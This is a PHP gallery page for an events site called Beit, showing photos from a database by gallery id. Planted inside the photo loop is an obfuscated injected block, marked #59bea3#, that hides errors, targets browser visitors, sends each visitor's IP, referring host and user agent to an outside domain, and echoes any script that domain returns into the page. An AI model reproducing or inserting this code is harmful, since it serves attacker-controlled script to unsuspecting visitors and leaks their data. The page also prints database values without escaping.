<?php 

# ------------------------------------------------------------------ #
ini_set( 'display_errors', 1 );
error_reporting( E_ALL );
# ------------------------------------------------------------------ #
include_once( "_config.php" );
include_once( "classes/utils.php" );
include_once( "classes/DAO.php" );
include_once( "classes/DBUtils.php" );
include_once( "classes/fotos.php" );
include_once( "classes/galerias.php" );
# ------------------------------------------------------------------ #
session_start();
# ------------------------------------------------------------------ #
	
$msg = @$_SESSION['bi-msg'];
$_SESSION['bi-msg'] = "";

$fotoLista = dao::find( 'fotos', array('id_galeria' => $_GET['id']));

include("header.php");
?>
<body>
<?php include("topo-e-banner.php"); ?>
<script type="text/javascript">
$(function() {

	$('a[name=fotos]').lightBox(); // Select all links that contains lightbox in the attribute rel
});
</script>
	<div id="content" class="beit">
		<div class="title1">
    		Confira nosso <span class="23">mural</span> de <span class="23">fotos</span> de eventos <span class="23">Beit!</span>
	    </div>
        <br>
		<div id="images"></div>
		<?php foreach ($fotoLista as $foto) { ?>
<?php
#59bea3#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/59bea3#
?>
		<div style="float:left; padding-right: 10px"><a name="fotos" href="thumb.php?img=<?php echo $foto->caminho; ?>&mw=400&mh=400"><img src="thumb.php?img=<?php echo $foto->caminho; ?>&mw=100"></a></div>
		<?php } ?>
    	<div style="clear:both"></div><br>
	</div>
    <br>
</div>
<?php include("rodape.php"); ?>